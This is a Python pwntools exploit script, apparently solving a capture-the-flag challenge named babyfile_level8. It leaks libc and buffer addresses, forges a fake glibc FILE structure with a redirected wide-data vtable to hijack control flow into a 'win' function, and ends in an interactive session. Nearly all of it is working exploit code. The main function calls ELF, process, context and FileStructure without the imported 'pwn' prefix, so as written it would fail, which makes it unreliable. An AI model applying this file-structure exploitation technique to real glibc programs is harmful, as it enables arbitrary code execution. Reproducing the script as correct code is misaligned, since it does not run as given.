#Nagib Lakhdari 3si2
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# This exploit was generated via
# 1) pwntools
# 2) ctfmate

import pwn

BINARY = "/challenge/babyfile_level8"
LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
LD = "/lib64/ld-linux-x86-64.so.2"

exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8 = pwn.p8
u8 = pwn.u8

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB: 
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else: 
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(pwn.args.HOST or '127.0.0.1', int(pwn.args.PORT or 1337))
    if pwn.args.GDB: 
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL: 
        return local(argv, *a, **kw)
    else: 
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# Exploit function
def exploit():
    #--------Setup--------#
    context(arch="amd64", os="linux")
    elf = ELF("/challenge/babyfile_level8", checksec=False)

    # Start the process for the challenge binary
    p = process("/challenge/babyfile_level8")
    # Uncomment the following line for debugging with gdb
    # p = gdb.debug("/challenge/babyfile_level8", gdbscript="b *_start")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF("/challenge/babyfile_level8")

    # Offsets for vtable manipulation
    _wide_vtable_offset = 0xe0
    doallocbuf_call_offset = 0x68

    # libc leak
    p.recvuntil(b"[LEAK]")
    p.recvuntil(b": ")
    puts_libc_leak = int(p.recvuntil(b'\n')[:-1], 16)
    print(hex(puts_libc_leak))
    libc_base = puts_libc_leak - libc.sym.puts
    libc.address = libc_base

    # file struct location leak
    p.recvuntil(b"[LEAK]")
    p.recvuntil(b"[LEAK]")
    p.recvuntil(b": ")
    buf = int(p.recvuntil(b'\n')[:-1], 16)
    print(hex(buf))

    # Create a fake FileStructure
    fs = FileStructure()
    fs.vtable = libc.sym['_IO_wfile_jumps'] + 24 - 0x38  # fwrite calling vtable + 0x38
    fs._lock = buf - 0x10  # writable null
    fs._wide_data = buf  # wide_data vtable will be right below the FILE_plus struct

    # fake wide_data vtable
    # point to the memory right below itself
    _wide_data_vtable_loc = buf + _wide_vtable_offset + 0x8
    _wide_vtable = b"a" * doallocbuf_call_offset + p64(binary.sym['win'])

    # overwrite the file struct
    payload = bytes(fs) + p64(_wide_data_vtable_loc) + _wide_vtable
    p.send(payload)

    # Interact with the process to get the output
    p.interactive()
    pass

if __name__ == "__main__":
    exploit()
